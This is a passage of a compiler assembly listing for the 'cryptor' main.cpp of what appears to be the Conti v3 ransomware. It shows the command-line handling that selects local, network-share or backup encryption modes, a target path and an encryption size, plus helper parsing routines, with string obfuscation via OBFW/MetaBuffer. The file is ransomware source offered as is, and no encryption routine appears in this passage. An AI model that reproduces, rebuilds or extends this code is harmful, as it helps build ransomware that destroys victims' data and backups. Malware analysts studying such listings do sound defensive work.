; 156  : 		else if (!plstrcmpiW(EncryptMode, OBFW(L"local"))) {

  001b9	48 8d 15 00 00
	00 00		 lea	 rdx, OFFSET FLAT:??_C@_1M@GFKCHEPI@?$AAl?$AAo?$AAc?$AAa?$AAl@
  001c0	48 8d 8d 68 03
	00 00		 lea	 rcx, QWORD PTR $T11[rbp]
  001c7	e8 00 00 00 00	 call	 ??0?$MetaBuffer@$0GL@$0EM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@QEAA@PEBE@Z ; MetaBuffer<107,76,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::MetaBuffer<107,76,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >
  001cc	48 8b c8	 mov	 rcx, rax
  001cf	e8 00 00 00 00	 call	 ?decrypt@?$MetaBuffer@$0GL@$0EM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@QEAAPEBDXZ ; MetaBuffer<107,76,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::decrypt
  001d4	48 8b d0	 mov	 rdx, rax
  001d7	48 8b 4d 68	 mov	 rcx, QWORD PTR EncryptMode$[rbp]
  001db	e8 00 00 00 00	 call	 ?plstrcmpiW@@YAHPEB_W0@Z ; plstrcmpiW
  001e0	85 c0		 test	 eax, eax
  001e2	75 0c		 jne	 SHORT $LN8@HandleComm

; 157  : 			global::SetEncryptMode(LOCAL_ENCRYPT);

  001e4	b9 0b 00 00 00	 mov	 ecx, 11
  001e9	e8 00 00 00 00	 call	 ?SetEncryptMode@global@@YAXH@Z ; global::SetEncryptMode

; 158  : 		}

  001ee	eb 6c		 jmp	 SHORT $LN9@HandleComm
$LN8@HandleComm:

; 159  : 		else if (!plstrcmpiW(EncryptMode, OBFW(L"net"))) {

  001f0	48 8d 15 00 00
	00 00		 lea	 rdx, OFFSET FLAT:??_C@_17ODNIDLDN@?$AAn?$AAe?$AAt@
  001f7	48 8d 8d 98 03
	00 00		 lea	 rcx, QWORD PTR $T12[rbp]
  001fe	e8 00 00 00 00	 call	 ??0?$MetaBuffer@$0ED@$0GD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06@std@@@@QEAA@PEBE@Z ; MetaBuffer<67,99,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7> >::MetaBuffer<67,99,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7> >
  00203	48 8b c8	 mov	 rcx, rax
  00206	e8 00 00 00 00	 call	 ?decrypt@?$MetaBuffer@$0ED@$0GD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06@std@@@@QEAAPEBDXZ ; MetaBuffer<67,99,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7> >::decrypt
  0020b	48 8b d0	 mov	 rdx, rax
  0020e	48 8b 4d 68	 mov	 rcx, QWORD PTR EncryptMode$[rbp]
  00212	e8 00 00 00 00	 call	 ?plstrcmpiW@@YAHPEB_W0@Z ; plstrcmpiW
  00217	85 c0		 test	 eax, eax
  00219	75 0c		 jne	 SHORT $LN10@HandleComm

; 160  : 			global::SetEncryptMode(NETWORK_ENCRYPT);

  0021b	b9 0c 00 00 00	 mov	 ecx, 12
  00220	e8 00 00 00 00	 call	 ?SetEncryptMode@global@@YAXH@Z ; global::SetEncryptMode

; 161  : 		}

  00225	eb 35		 jmp	 SHORT $LN11@HandleComm
$LN10@HandleComm:

; 162  : 		else if (!plstrcmpiW(EncryptMode, OBFW(L"backups"))) {

  00227	48 8d 15 00 00
	00 00		 lea	 rdx, OFFSET FLAT:??_C@_1BA@FMKEKOCJ@?$AAb?$AAa?$AAc?$AAk?$AAu?$AAp?$AAs@
  0022e	48 8d 8d c8 03
	00 00		 lea	 rcx, QWORD PTR $T13[rbp]
  00235	e8 00 00 00 00	 call	 ??0?$MetaBuffer@$0CL@$0GM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@@std@@@@QEAA@PEBE@Z ; MetaBuffer<43,108,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15> >::MetaBuffer<43,108,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15> >
  0023a	48 8b c8	 mov	 rcx, rax
  0023d	e8 00 00 00 00	 call	 ?decrypt@?$MetaBuffer@$0CL@$0GM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@@std@@@@QEAAPEBDXZ ; MetaBuffer<43,108,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15> >::decrypt
  00242	48 8b d0	 mov	 rdx, rax
  00245	48 8b 4d 68	 mov	 rcx, QWORD PTR EncryptMode$[rbp]
  00249	e8 00 00 00 00	 call	 ?plstrcmpiW@@YAHPEB_W0@Z ; plstrcmpiW
  0024e	85 c0		 test	 eax, eax
  00250	75 0a		 jne	 SHORT $LN12@HandleComm

; 163  : 			global::SetEncryptMode(BACKUPS_ENCRYPT);

  00252	b9 0d 00 00 00	 mov	 ecx, 13
  00257	e8 00 00 00 00	 call	 ?SetEncryptMode@global@@YAXH@Z ; global::SetEncryptMode
$LN12@HandleComm:
$LN11@HandleComm:
$LN9@HandleComm:
$LN7@HandleComm:
$LN5@HandleComm:

; 164  : 		}
; 165  : 
; 166  : 	}
; 167  : 
; 168  : 	if (Path) {

  0025c	48 83 7d 48 00	 cmp	 QWORD PTR Path$[rbp], 0
  00261	74 1a		 je	 SHORT $LN13@HandleComm

; 169  : 
; 170  : 		global::SetEncryptMode(PATH_ENCRYPT);

  00263	b9 0e 00 00 00	 mov	 ecx, 14
  00268	e8 00 00 00 00	 call	 ?SetEncryptMode@global@@YAXH@Z ; global::SetEncryptMode

; 171  : 		g_Path = Path;

  0026d	48 8b 55 48	 mov	 rdx, QWORD PTR Path$[rbp]
  00271	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:?g_Path@@3V?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@A ; g_Path
  00278	e8 00 00 00 00	 call	 ??4?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAAAEAV01@QEB_W@Z ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::operator=
$LN13@HandleComm:

; 172  : 
; 173  : 	}
; 174  : 
; 175  : 	if (Size) {

  0027d	48 83 bd a8 00
	00 00 00	 cmp	 QWORD PTR Size$[rbp], 0
  00285	74 1d		 je	 SHORT $LN14@HandleComm

; 176  : 
; 177  : 		INT iSize = ConvertSizeStr(Size);

  00287	48 8b 8d a8 00
	00 00		 mov	 rcx, QWORD PTR Size$[rbp]
  0028e	e8 00 00 00 00	 call	 ?ConvertSizeStr@@YAHPEA_W@Z ; ConvertSizeStr
  00293	89 85 c4 00 00
	00		 mov	 DWORD PTR iSize$4[rbp], eax

; 178  : 		global::SetEncryptSize(iSize);

  00299	8b 8d c4 00 00
	00		 mov	 ecx, DWORD PTR iSize$4[rbp]
  0029f	e8 00 00 00 00	 call	 ?SetEncryptSize@global@@YAHH@Z ; global::SetEncryptSize
$LN14@HandleComm:

; 179  : 
; 180  : 	}
; 181  : 
; 182  : 	if (LogFile) {

  002a4	48 83 bd 88 00
	00 00 00	 cmp	 QWORD PTR LogFile$[rbp], 0
  002ac	74 0c		 je	 SHORT $LN15@HandleComm

; 183  : 
; 184  : 		logs::Init(LogFile);

  002ae	48 8b 8d 88 00
	00 00		 mov	 rcx, QWORD PTR LogFile$[rbp]
  002b5	e8 00 00 00 00	 call	 ?Init@logs@@YAXPEB_W@Z	; logs::Init
$LN15@HandleComm:

; 185  : 
; 186  : 	}
; 187  : 
; 188  : 	return TRUE;

  002ba	b8 01 00 00 00	 mov	 eax, 1
$LN1@HandleComm:

; 189  : }

  002bf	48 8b f8	 mov	 rdi, rax
  002c2	48 8d 4d e0	 lea	 rcx, QWORD PTR [rbp-32]
  002c6	48 8d 15 00 00
	00 00		 lea	 rdx, OFFSET FLAT:?HandleCommandLine@@YAHPEA_W@Z$rtcFrameData
  002cd	e8 00 00 00 00	 call	 _RTC_CheckStackVars
  002d2	48 8b c7	 mov	 rax, rdi
  002d5	48 8b 8d e8 03
	00 00		 mov	 rcx, QWORD PTR __$ArrayPad$[rbp]
  002dc	48 33 cd	 xor	 rcx, rbp
  002df	e8 00 00 00 00	 call	 __security_check_cookie
  002e4	48 8d a5 f8 03
	00 00		 lea	 rsp, QWORD PTR [rbp+1016]
  002eb	5f		 pop	 rdi
  002ec	5d		 pop	 rbp
  002ed	c3		 ret	 0
?HandleCommandLine@@YAHPEA_W@Z ENDP			; HandleCommandLine
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\main.cpp
;	COMDAT ?ConvertSizeStr@@YAHPEA_W@Z
_TEXT	SEGMENT
NeedLength$ = 4
Utf8String$ = 40
tv84 = 244
SizeStr$ = 288
?ConvertSizeStr@@YAHPEA_W@Z PROC			; ConvertSizeStr, COMDAT

; 113  : {

$LN5:
  00000	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00005	55		 push	 rbp
  00006	57		 push	 rdi
  00007	48 81 ec 48 01
	00 00		 sub	 rsp, 328		; 00000148H
  0000e	48 8d 6c 24 40	 lea	 rbp, QWORD PTR [rsp+64]
  00013	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__18E689E6_main@cpp
  0001a	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 114  : 	INT NeedLength = pWideCharToMultiByte(CP_UTF8, 0, SizeStr, plstrlenW(SizeStr), NULL, 0, NULL, NULL);

  0001f	48 8b 8d 20 01
	00 00		 mov	 rcx, QWORD PTR SizeStr$[rbp]
  00026	e8 00 00 00 00	 call	 ?plstrlenW@@YAHPEB_W@Z	; plstrlenW
  0002b	48 c7 44 24 38
	00 00 00 00	 mov	 QWORD PTR [rsp+56], 0
  00034	48 c7 44 24 30
	00 00 00 00	 mov	 QWORD PTR [rsp+48], 0
  0003d	c7 44 24 28 00
	00 00 00	 mov	 DWORD PTR [rsp+40], 0
  00045	48 c7 44 24 20
	00 00 00 00	 mov	 QWORD PTR [rsp+32], 0
  0004e	44 8b c8	 mov	 r9d, eax
  00051	4c 8b 85 20 01
	00 00		 mov	 r8, QWORD PTR SizeStr$[rbp]
  00058	33 d2		 xor	 edx, edx
  0005a	b9 e9 fd 00 00	 mov	 ecx, 65001		; 0000fde9H
  0005f	e8 00 00 00 00	 call	 ?pWideCharToMultiByte@@YAHIKPEB_WHPEADHPEBDPEAH@Z ; pWideCharToMultiByte
  00064	89 45 04	 mov	 DWORD PTR NeedLength$[rbp], eax

; 115  : 	if (!NeedLength) {

  00067	83 7d 04 00	 cmp	 DWORD PTR NeedLength$[rbp], 0
  0006b	75 04		 jne	 SHORT $LN2@ConvertSiz

; 116  : 		return 0;

  0006d	33 c0		 xor	 eax, eax
  0006f	eb 79		 jmp	 SHORT $LN1@ConvertSiz
$LN2@ConvertSiz:

; 117  : 	}
; 118  : 
; 119  : 	LPSTR Utf8String = (LPSTR)m_malloc(NeedLength + 1);

  00071	8b 45 04	 mov	 eax, DWORD PTR NeedLength$[rbp]
  00074	ff c0		 inc	 eax
  00076	48 98		 cdqe
  00078	48 8b c8	 mov	 rcx, rax
  0007b	e8 00 00 00 00	 call	 ?m_malloc@@YAPEAX_K@Z	; m_malloc
  00080	48 89 45 28	 mov	 QWORD PTR Utf8String$[rbp], rax

; 120  : 	if (!Utf8String) {

  00084	48 83 7d 28 00	 cmp	 QWORD PTR Utf8String$[rbp], 0
  00089	75 04		 jne	 SHORT $LN3@ConvertSiz

; 121  : 		return 0;

  0008b	33 c0		 xor	 eax, eax
  0008d	eb 5b		 jmp	 SHORT $LN1@ConvertSiz
$LN3@ConvertSiz:

; 122  : 	}
; 123  : 
; 124  : 	pWideCharToMultiByte(CP_UTF8, 0, SizeStr, plstrlenW(SizeStr), Utf8String, NeedLength + 1, NULL, NULL);

  0008f	8b 45 04	 mov	 eax, DWORD PTR NeedLength$[rbp]
  00092	ff c0		 inc	 eax
  00094	89 85 f4 00 00
	00		 mov	 DWORD PTR tv84[rbp], eax
  0009a	48 8b 8d 20 01
	00 00		 mov	 rcx, QWORD PTR SizeStr$[rbp]
  000a1	e8 00 00 00 00	 call	 ?plstrlenW@@YAHPEB_W@Z	; plstrlenW
  000a6	48 c7 44 24 38
	00 00 00 00	 mov	 QWORD PTR [rsp+56], 0
  000af	48 c7 44 24 30
	00 00 00 00	 mov	 QWORD PTR [rsp+48], 0
  000b8	8b 8d f4 00 00
	00		 mov	 ecx, DWORD PTR tv84[rbp]
  000be	89 4c 24 28	 mov	 DWORD PTR [rsp+40], ecx
  000c2	48 8b 4d 28	 mov	 rcx, QWORD PTR Utf8String$[rbp]
  000c6	48 89 4c 24 20	 mov	 QWORD PTR [rsp+32], rcx
  000cb	44 8b c8	 mov	 r9d, eax
  000ce	4c 8b 85 20 01
	00 00		 mov	 r8, QWORD PTR SizeStr$[rbp]
  000d5	33 d2		 xor	 edx, edx
  000d7	b9 e9 fd 00 00	 mov	 ecx, 65001		; 0000fde9H
  000dc	e8 00 00 00 00	 call	 ?pWideCharToMultiByte@@YAHIKPEB_WHPEADHPEBDPEAH@Z ; pWideCharToMultiByte

; 125  : 
; 126  : 	return SToI(Utf8String);

  000e1	48 8b 4d 28	 mov	 rcx, QWORD PTR Utf8String$[rbp]
  000e5	e8 00 00 00 00	 call	 ?SToI@@YAHPEAD@Z	; SToI
$LN1@ConvertSiz:

; 127  : }

  000ea	48 8d a5 08 01
	00 00		 lea	 rsp, QWORD PTR [rbp+264]
  000f1	5f		 pop	 rdi
  000f2	5d		 pop	 rbp
  000f3	c3		 ret	 0
?ConvertSizeStr@@YAHPEA_W@Z ENDP			; ConvertSizeStr
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\main.cpp
;	COMDAT ?FindCommandLineArg@@YAHPEAPEA_WHPEB_W@Z
_TEXT	SEGMENT
i$1 = 4
Argv$ = 256
Argc$ = 264
ArgName$ = 272
?FindCommandLineArg@@YAHPEAPEA_WHPEB_W@Z PROC		; FindCommandLineArg, COMDAT

; 93   : {

$LN8:
  00000	4c 89 44 24 18	 mov	 QWORD PTR [rsp+24], r8
  00005	89 54 24 10	 mov	 DWORD PTR [rsp+16], edx
  00009	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  0000e	55		 push	 rbp
  0000f	57		 push	 rdi
  00010	48 81 ec 08 01
	00 00		 sub	 rsp, 264		; 00000108H
  00017	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  0001c	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__18E689E6_main@cpp
  00023	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 94   : 	if (Argc <= 1) {

  00028	83 bd 08 01 00
	00 01		 cmp	 DWORD PTR Argc$[rbp], 1
  0002f	7f 04		 jg	 SHORT $LN5@FindComman

; 95   : 		return FALSE;

  00031	33 c0		 xor	 eax, eax
  00033	eb 46		 jmp	 SHORT $LN1@FindComman
$LN5@FindComman:

; 96   : 	}
; 97   : 
; 98   : 	for (INT i = 1; i < Argc; i++) {

  00035	c7 45 04 01 00
	00 00		 mov	 DWORD PTR i$1[rbp], 1
  0003c	eb 08		 jmp	 SHORT $LN4@FindComman
$LN2@FindComman:
  0003e	8b 45 04	 mov	 eax, DWORD PTR i$1[rbp]
  00041	ff c0		 inc	 eax
  00043	89 45 04	 mov	 DWORD PTR i$1[rbp], eax
$LN4@FindComman:
  00046	8b 85 08 01 00
	00		 mov	 eax, DWORD PTR Argc$[rbp]
  0004c	39 45 04	 cmp	 DWORD PTR i$1[rbp], eax
  0004f	7d 28		 jge	 SHORT $LN3@FindComman

; 99   : 		if (!plstrcmpiW(Argv[i], ArgName)) {

  00051	48 63 45 04	 movsxd	 rax, DWORD PTR i$1[rbp]
  00055	48 8b 95 10 01
	00 00		 mov	 rdx, QWORD PTR ArgName$[rbp]
  0005c	48 8b 8d 00 01
	00 00		 mov	 rcx, QWORD PTR Argv$[rbp]
  00063	48 8b 0c c1	 mov	 rcx, QWORD PTR [rcx+rax*8]
  00067	e8 00 00 00 00	 call	 ?plstrcmpiW@@YAHPEB_W0@Z ; plstrcmpiW
  0006c	85 c0		 test	 eax, eax
  0006e	75 07		 jne	 SHORT $LN6@FindComman

; 100  : 			return TRUE;

  00070	b8 01 00 00 00	 mov	 eax, 1
  00075	eb 04		 jmp	 SHORT $LN1@FindComman
$LN6@FindComman:

; 101  : 		}
; 102  : 	}

  00077	eb c5		 jmp	 SHORT $LN2@FindComman
$LN3@FindComman:

; 103  : 	
; 104  : 	return FALSE;

  00079	33 c0		 xor	 eax, eax
$LN1@FindComman:

; 105  : }

  0007b	48 8d a5 e8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+232]
  00082	5f		 pop	 rdi
  00083	5d		 pop	 rbp
  00084	c3		 ret	 0
?FindCommandLineArg@@YAHPEAPEA_WHPEB_W@Z ENDP		; FindCommandLineArg
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\main.cpp
;	COMDAT ?GetCommandLineArg@@YAPEA_WPEAPEA_WHPEB_W@Z
_TEXT	SEGMENT
i$1 = 4
Argv$ = 256
Argc$ = 264
ArgName$ = 272
?GetCommandLineArg@@YAPEA_WPEAPEA_WHPEB_W@Z PROC	; GetCommandLineArg, COMDAT

; 68   : {

$LN9:
  00000	4c 89 44 24 18	 mov	 QWORD PTR [rsp+24], r8
  00005	89 54 24 10	 mov	 DWORD PTR [rsp+16], edx
  00009	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  0000e	55		 push	 rbp
  0000f	57		 push	 rdi
  00010	48 81 ec 08 01
	00 00		 sub	 rsp, 264		; 00000108H
  00017	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  0001c	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__18E689E6_main@cpp
  00023	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 69   : 	if (Argc <= 1) {

  00028	83 bd 08 01 00
	00 01		 cmp	 DWORD PTR Argc$[rbp], 1
  0002f	7f 04		 jg	 SHORT $LN5@GetCommand

; 70   : 		return NULL;

  00031	33 c0		 xor	 eax, eax
  00033	eb 60		 jmp	 SHORT $LN1@GetCommand
$LN5@GetCommand:

; 71   : 	}
; 72   : 
; 73   : 	for (INT i = 1; i < Argc; i++) {

  00035	c7 45 04 01 00
	00 00		 mov	 DWORD PTR i$1[rbp], 1
  0003c	eb 08		 jmp	 SHORT $LN4@GetCommand
$LN2@GetCommand:
  0003e	8b 45 04	 mov	 eax, DWORD PTR i$1[rbp]
  00041	ff c0		 inc	 eax
  00043	89 45 04	 mov	 DWORD PTR i$1[rbp], eax
$LN4@GetCommand:
  00046	8b 85 08 01 00
	00		 mov	 eax, DWORD PTR Argc$[rbp]
  0004c	39 45 04	 cmp	 DWORD PTR i$1[rbp], eax
  0004f	7d 42		 jge	 SHORT $LN3@GetCommand

; 74   : 		if (!plstrcmpiW(Argv[i], ArgName)) {

  00051	48 63 45 04	 movsxd	 rax, DWORD PTR i$1[rbp]
  00055	48 8b 95 10 01
	00 00		 mov	 rdx, QWORD PTR ArgName$[rbp]
  0005c	48 8b 8d 00 01
	00 00		 mov	 rcx, QWORD PTR Argv$[rbp]
  00063	48 8b 0c c1	 mov	 rcx, QWORD PTR [rcx+rax*8]
  00067	e8 00 00 00 00	 call	 ?plstrcmpiW@@YAHPEB_W0@Z ; plstrcmpiW
  0006c	85 c0		 test	 eax, eax
  0006e	75 21		 jne	 SHORT $LN6@GetCommand

; 75   : 
; 76   : 			if ((i + 1) < Argc) {

  00070	8b 45 04	 mov	 eax, DWORD PTR i$1[rbp]
  00073	ff c0		 inc	 eax
  00075	3b 85 08 01 00
	00		 cmp	 eax, DWORD PTR Argc$[rbp]
  0007b	7d 14		 jge	 SHORT $LN7@GetCommand

; 77   : 				return Argv[i + 1];

  0007d	8b 45 04	 mov	 eax, DWORD PTR i$1[rbp]
  00080	ff c0		 inc	 eax
  00082	48 98		 cdqe
  00084	48 8b 8d 00 01
	00 00		 mov	 rcx, QWORD PTR Argv$[rbp]
  0008b	48 8b 04 c1	 mov	 rax, QWORD PTR [rcx+rax*8]
  0008f	eb 04		 jmp	 SHORT $LN1@GetCommand
$LN7@GetCommand:
$LN6@GetCommand:

; 78   : 			}
; 79   : 
; 80   : 		}
; 81   : 	}

  00091	eb ab		 jmp	 SHORT $LN2@GetCommand
$LN3@GetCommand:

; 82   : 
; 83   : 	return NULL;

  00093	33 c0		 xor	 eax, eax
$LN1@GetCommand:

; 84   : }

  00095	48 8d a5 e8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+232]
  0009c	5f		 pop	 rdi
  0009d	5d		 pop	 rbp
  0009e	c3		 ret	 0
?GetCommandLineArg@@YAPEA_WPEAPEA_WHPEB_W@Z ENDP	; GetCommandLineArg
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\main.cpp
;	COMDAT ?SToI@@YAHPEAD@Z
_TEXT	SEGMENT
strLen$ = 4
i$ = 36
num$ = 68
ten$ = 100
signFlag$ = 132
j$1 = 164
str$ = 416
?SToI@@YAHPEAD@Z PROC					; SToI, COMDAT

; 20   : SToI(__in char* str) {

$LN17:
  00000	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00005	55		 push	 rbp
  00006	57		 push	 rdi
  00007	48 81 ec a8 01
	00 00		 sub	 rsp, 424		; 000001a8H
  0000e	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00013	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__18E689E6_main@cpp
  0001a	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 21   : 	unsigned int strLen = 0;

  0001f	c7 45 04 00 00
	00 00		 mov	 DWORD PTR strLen$[rbp], 0

; 22   : 	unsigned int i = 0;

  00026	c7 45 24 00 00
	00 00		 mov	 DWORD PTR i$[rbp], 0
$LN2@SToI:

; 23   : 	while (str[i] != '\0') {

  0002d	8b 45 24	 mov	 eax, DWORD PTR i$[rbp]
  00030	48 8b 8d a0 01
	00 00		 mov	 rcx, QWORD PTR str$[rbp]
  00037	0f be 04 01	 movsx	 eax, BYTE PTR [rcx+rax]
  0003b	85 c0		 test	 eax, eax
  0003d	74 12		 je	 SHORT $LN3@SToI

; 24   : 		strLen += 1;

  0003f	8b 45 04	 mov	 eax, DWORD PTR strLen$[rbp]
  00042	ff c0		 inc	 eax
  00044	89 45 04	 mov	 DWORD PTR strLen$[rbp], eax

; 25   : 		i++;

  00047	8b 45 24	 mov	 eax, DWORD PTR i$[rbp]
  0004a	ff c0		 inc	 eax
  0004c	89 45 24	 mov	 DWORD PTR i$[rbp], eax

; 26   : 	}

  0004f	eb dc		 jmp	 SHORT $LN2@SToI
$LN3@SToI:

; 27   : 
; 28   : 	int num = 0;

  00051	c7 45 44 00 00
	00 00		 mov	 DWORD PTR num$[rbp], 0

; 29   : 	int ten;
; 30   : 	BOOL signFlag = TRUE; //true: +, false: -

  00058	c7 85 84 00 00
	00 01 00 00 00	 mov	 DWORD PTR signFlag$[rbp], 1

; 31   : 	for (i = 0; i < strLen; i++) {

  00062	c7 45 24 00 00
	00 00		 mov	 DWORD PTR i$[rbp], 0
  00069	eb 08		 jmp	 SHORT $LN6@SToI
$LN4@SToI:
  0006b	8b 45 24	 mov	 eax, DWORD PTR i$[rbp]
  0006e	ff c0		 inc	 eax
  00070	89 45 24	 mov	 DWORD PTR i$[rbp], eax
$LN6@SToI:
  00073	8b 45 04	 mov	 eax, DWORD PTR strLen$[rbp]
  00076	39 45 24	 cmp	 DWORD PTR i$[rbp], eax
  00079	0f 83 d9 00 00
	00		 jae	 $LN5@SToI

; 32   : 		if (str[i] < '0' || str[i] > '9') {

  0007f	8b 45 24	 mov	 eax, DWORD PTR i$[rbp]
  00082	48 8b 8d a0 01
	00 00		 mov	 rcx, QWORD PTR str$[rbp]
  00089	0f be 04 01	 movsx	 eax, BYTE PTR [rcx+rax]
  0008d	83 f8 30	 cmp	 eax, 48			; 00000030H
  00090	7c 13		 jl	 SHORT $LN11@SToI
  00092	8b 45 24	 mov	 eax, DWORD PTR i$[rbp]
  00095	48 8b 8d a0 01
	00 00		 mov	 rcx, QWORD PTR str$[rbp]
  0009c	0f be 04 01	 movsx	 eax, BYTE PTR [rcx+rax]
  000a0	83 f8 39	 cmp	 eax, 57			; 00000039H
  000a3	7e 51		 jle	 SHORT $LN10@SToI
$LN11@SToI:

; 33   : 			if (i == 0 && str[i] == '-') {

  000a5	83 7d 24 00	 cmp	 DWORD PTR i$[rbp], 0
  000a9	75 1f		 jne	 SHORT $LN12@SToI
  000ab	8b 45 24	 mov	 eax, DWORD PTR i$[rbp]
  000ae	48 8b 8d a0 01
	00 00		 mov	 rcx, QWORD PTR str$[rbp]
  000b5	0f be 04 01	 movsx	 eax, BYTE PTR [rcx+rax]
  000b9	83 f8 2d	 cmp	 eax, 45			; 0000002dH
  000bc	75 0c		 jne	 SHORT $LN12@SToI

; 34   : 				signFlag = FALSE;

  000be	c7 85 84 00 00
	00 00 00 00 00	 mov	 DWORD PTR signFlag$[rbp], 0

; 35   : 				continue;

  000c8	eb a1		 jmp	 SHORT $LN4@SToI
$LN12@SToI:

; 36   : 			}
; 37   : 			if (i == 0 && str[i] == '+') {

  000ca	83 7d 24 00	 cmp	 DWORD PTR i$[rbp], 0
  000ce	75 22		 jne	 SHORT $LN13@SToI
  000d0	8b 45 24	 mov	 eax, DWORD PTR i$[rbp]
  000d3	48 8b 8d a0 01
	00 00		 mov	 rcx, QWORD PTR str$[rbp]
  000da	0f be 04 01	 movsx	 eax, BYTE PTR [rcx+rax]
  000de	83 f8 2b	 cmp	 eax, 43			; 0000002bH
  000e1	75 0f		 jne	 SHORT $LN13@SToI

; 38   : 				signFlag = TRUE;

  000e3	c7 85 84 00 00
	00 01 00 00 00	 mov	 DWORD PTR signFlag$[rbp], 1

; 39   : 				continue;

  000ed	e9 79 ff ff ff	 jmp	 $LN4@SToI
$LN13@SToI:

; 40   : 			}
; 41   : 
; 42   : 			return 0;

  000f2	33 c0		 xor	 eax, eax
  000f4	eb 77		 jmp	 SHORT $LN1@SToI
$LN10@SToI:

; 43   : 		}
; 44   : 
; 45   : 		ten = 1;

  000f6	c7 45 64 01 00
	00 00		 mov	 DWORD PTR ten$[rbp], 1

; 46   : 		for (unsigned int j = 0; j < strLen - 1 - i; j++) {

  000fd	c7 85 a4 00 00
	00 00 00 00 00	 mov	 DWORD PTR j$1[rbp], 0
  00107	eb 0e		 jmp	 SHORT $LN9@SToI
$LN7@SToI:
  00109	8b 85 a4 00 00
	00		 mov	 eax, DWORD PTR j$1[rbp]
  0010f	ff c0		 inc	 eax
  00111	89 85 a4 00 00
	00		 mov	 DWORD PTR j$1[rbp], eax
$LN9@SToI:
  00117	8b 45 04	 mov	 eax, DWORD PTR strLen$[rbp]
  0011a	ff c8		 dec	 eax
  0011c	2b 45 24	 sub	 eax, DWORD PTR i$[rbp]
  0011f	39 85 a4 00 00
	00		 cmp	 DWORD PTR j$1[rbp], eax
  00125	73 09		 jae	 SHORT $LN8@SToI

; 47   : 			ten *= 10;

  00127	6b 45 64 0a	 imul	 eax, DWORD PTR ten$[rbp], 10
  0012b	89 45 64	 mov	 DWORD PTR ten$[rbp], eax

; 48   : 		}

  0012e	eb d9		 jmp	 SHORT $LN7@SToI
$LN8@SToI:

; 49   : 
; 50   : 		num += ten * (str[i] - '0');

  00130	8b 45 24	 mov	 eax, DWORD PTR i$[rbp]
  00133	48 8b 8d a0 01
	00 00		 mov	 rcx, QWORD PTR str$[rbp]
  0013a	0f be 04 01	 movsx	 eax, BYTE PTR [rcx+rax]
  0013e	83 e8 30	 sub	 eax, 48			; 00000030H
  00141	8b 4d 64	 mov	 ecx, DWORD PTR ten$[rbp]
  00144	0f af c8	 imul	 ecx, eax
  00147	8b c1		 mov	 eax, ecx
  00149	8b 4d 44	 mov	 ecx, DWORD PTR num$[rbp]
  0014c	03 c8		 add	 ecx, eax
  0014e	8b c1		 mov	 eax, ecx
  00150	89 45 44	 mov	 DWORD PTR num$[rbp], eax

; 51   : 	}

  00153	e9 13 ff ff ff	 jmp	 $LN4@SToI
$LN5@SToI:

; 52   : 
; 53   : 	if (signFlag) {

  00158	83 bd 84 00 00
	00 00		 cmp	 DWORD PTR signFlag$[rbp], 0
  0015f	74 07		 je	 SHORT $LN14@SToI

; 54   : 		return num;

  00161	8b 45 44	 mov	 eax, DWORD PTR num$[rbp]
  00164	eb 07		 jmp	 SHORT $LN1@SToI

; 55   : 	}

  00166	eb 05		 jmp	 SHORT $LN15@SToI
$LN14@SToI:

; 56   : 	else {
; 57   : 		return -num;

  00168	8b 45 44	 mov	 eax, DWORD PTR num$[rbp]
  0016b	f7 d8		 neg	 eax
$LN15@SToI:
$LN1@SToI:

; 58   : 	}
; 59   : }

  0016d	48 8d a5 88 01
	00 00		 lea	 rsp, QWORD PTR [rbp+392]
  00174	5f		 pop	 rdi
  00175	5d		 pop	 rbp
  00176	c3		 ret	 0
